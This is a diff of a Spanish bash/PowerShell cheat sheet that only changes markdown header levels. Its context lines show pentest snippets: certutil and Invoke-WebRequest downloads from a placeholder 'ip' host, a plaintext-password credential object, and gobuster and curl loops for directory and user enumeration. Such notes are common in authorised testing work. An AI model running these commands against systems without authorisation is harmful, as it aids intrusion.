@@ -1,5 +1,5 @@
 # Notas bash/powershell
-### Ayuda memoria 
+## Ayuda memoria 
 
 ![GitHub Logo](https://cloud.githubusercontent.com/assets/5456665/13322882/e74f6626-dc00-11e5-921d-f6d024a01eaa.png "GitHub")
 
@@ -42,7 +42,7 @@ Invoke-WebRequest "http://ip/file" -OutFile "c:\Users\file"
 certutil.exe -f -urlcache -split http://ip/file file
 
 ---
-### Creación de compartidas
+#### Creación de compartidas
 $pass=convertto-securestring 'pass' -AsPlainText -Force
 
 $creds=New-Object System.Management.Automation.PSCredential('user', $pass)
@@ -160,7 +160,7 @@ curl -U "USUARIO" --referer URL-SRC URL-DST
 openssl PASSWORD
 
 ---
-### Oneliners
+#### Oneliners
 for i in admin dev test backup; do gobuster -u "url"/$i -w "wordlist" -t -o outputFile$i.txt; done
 
 for i in {1..20}; do curl http://192.168.46.5/users/$i 2>&1 | grep "s page</h1>" | cut -f2 -d '>' | cut -f1 -d \' ;done --> *enumeración de usuarios*
@@ -358,7 +358,7 @@ prefix + ! --> *mueve el panel activo a una nueva ventana*
 
 prefix + [ --> *para buscar texto*
 
-### Tmux copy mode
+#### Tmux copy mode
 prefix + [
 
 prefix + space
